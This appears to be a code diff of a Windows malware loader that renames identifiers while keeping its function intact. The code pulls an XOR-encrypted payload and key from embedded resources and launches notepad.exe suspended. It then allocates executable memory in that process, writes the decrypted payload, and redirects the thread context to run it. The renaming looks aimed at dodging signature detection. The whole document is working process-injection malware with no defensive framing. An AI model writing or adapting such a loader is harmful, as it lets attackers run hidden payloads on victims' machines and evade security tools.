@@ -10,27 +10,30 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void loadResource_with(const char* renamer, char** data, DWORD* size) {
+void its_load_re(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
+    
     HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
-    HGLOBAL hResData = LoadResource(hModule, hResource);
+    HGLOBAL resrdata = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
-    *data = (char*)LockResource(hResData);
+    *data = (char*)LockResource(resrdata);
 }
 
 int main() {
     
-    char* key101k;
-    DWORD key101kLen;
-    loadResource_with("dhanushkey1", &key101k, &key101kLen);
+    char* ke;
+    DWORD keLen;
+    its_load_re("dhanushkey1", &ke, &keLen);
     const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
     char* code199k;
     DWORD code199kLen;
-    loadResource_with("dhanushcode56", &code199k, &code199kLen);
+    its_load_re("dhanushcode56", &code199k, &code199kLen);
 
+    STARTUPINFO li = {0};
+    
   HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");
 
-    BOOL (*pCreateProcess)(
+    BOOL (*itscreatetPro)(
         LPCSTR lpApplicationName,
         LPSTR lpCommandLine,
         LPSECURITY_ATTRIBUTES lpProcessAttributes,
@@ -51,12 +54,11 @@ int main() {
    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
     (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(istfromKernel32, "WriteProcessMemory");
      
-    STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    LARGE_INTEGER counter;
-    QueryPerformanceCounter(&counter);
-    pCreateProcess(processptaah, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    li.cb = sizeof(li);
+    
+    
+    itscreatetPro(processptaah, 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &li, &pi);
     GetTickCount();
     
     CONTEXT ctx = {0};
@@ -65,13 +67,13 @@ int main() {
     
     GetThreadContext(pi.hThread, &ctx);
 
-    LPVOID saber = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
-    for (DWORD da = 0; da < code199kLen; da++) {
-        code199k[da] ^= key101k[da % key101kLen];
+    for (DWORD i = 0; i < code199kLen; i++) {
+        code199k[i] ^= ke[i % keLen];
     }
-    pWriteProcessM(pi.hProcess, saber, code199k, code199kLen, NULL);
-    ctx.Rcx = (DWORD64)saber; 
+    pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
+    ctx.Rcx = (DWORD64)gallio; 
     SetThreadContext(pi.hThread, &ctx);
 
     ResumeThread(pi.hThread); 
